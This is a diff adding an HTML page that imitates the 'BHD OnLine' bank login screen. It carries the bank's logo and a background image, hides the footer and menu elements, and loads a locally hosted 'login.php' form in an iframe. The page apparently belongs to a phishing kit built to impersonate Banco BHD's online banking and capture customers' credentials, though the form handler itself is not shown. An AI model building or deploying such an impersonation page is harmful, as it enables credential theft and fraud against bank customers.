@@ -1,0 +1,109 @@
+<html><head>
+    <meta name="viewport" content="user-scalable=no, width=device-width, initial-scale=1">
+    <script>
+        var imagen = "bhds.webp"
+        localStorage.setItem("imagen", imagen);
+    </script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: none;
+            background-image: url("bhds.webp");
+            /* Ruta a tu imagen de fondo */
+            background-repeat: no-repeat;
+            /* Evita que la imagen se repita */
+            background-size: cover;
+            /* Escala la imagen para cubrir todo el fondo */
+            text-align: center;
+            display: flex;
+            /* Añade flexbox al body */
+            justify-content: center;
+            /* Centra horizontalmente */
+            align-items: center;
+            /* Centra verticalmente */
+            height: 100vh;
+            /* Altura total de la ventana */
+        }
+
+        .logo img {
+            width: 270px;
+            height: 80px;
+            margin: 15px auto;
+        }
+
+        .logoSB {
+            display: none;
+        }
+
+        .header-content {
+
+            width: 80%;
+            max-width: 300px;
+            padding: 15px;
+
+            position: relative;
+            height: 700px;
+            background: #fff;
+            border-radius: 4px;
+            color: #7e7975;
+            box-shadow: 0 2px 2px rgba(0, 0, 0, .2), 0 1px 5px rgba(0, 0, 0, .2), 0 0 0 12px hsla(0, 0%, 100%, .4);
+        }
+
+        iframe.loginPortlet {
+            width: 263px;
+            overflow: hidden;
+            height: 600px;
+            border: none;
+            margin: auto;
+            /* Centra el iframe en el contenedor */
+        }
+
+        #footer,
+        .bhd-login-btn,
+        .bhd-login-btn-selected,
+        .global-menu-open {
+            display: none;
+        }
+
+        @media only screen and (max-width: 600px) {
+            .header-content {
+                max-width: 100%;
+            }
+
+            iframe.loginPortlet {
+               
+                height: 600px;
+             
+            }
+        }
+    </style>
+</head>
+
+<body style="text-align: center; background-image: url(&quot;bhds.webp&quot;);">
+
+    <section class="header-content">
+        <a href="#" class="logo">
+            <img src="logo-1.png" alt="" class="img-responsive" width="325" height="100">
+        </a>
+
+        <span class="global-menu-open">Abrir</span>
+        <section class="content-menu-login">
+
+            <article class="bhd-login"> <span class="bhd-login-btn">BHD OnLine</span> <span class="bhd-login-btn-selected">BHD OnLine</span>
+                <div class="bhd-form" style="height: 450px;">
+                    <iframe class="loginPortlet" src="login.php"></iframe>
+                    <div class="loadingoverlay" style="display: none;"> <em class="loading"></em> </div>
+                </div>
+            </article>
+        </section>
+    </section>
+
+    <script>
+        setInterval(function() {
+            if (localStorage.getItem("imagen") !== 'bhds.webpp') {
+                document.body.style.backgroundImage = "url(" + localStorage.getItem("imagen") + ")";
+            }
+        }, 500);
+    </script>
+</body></html>
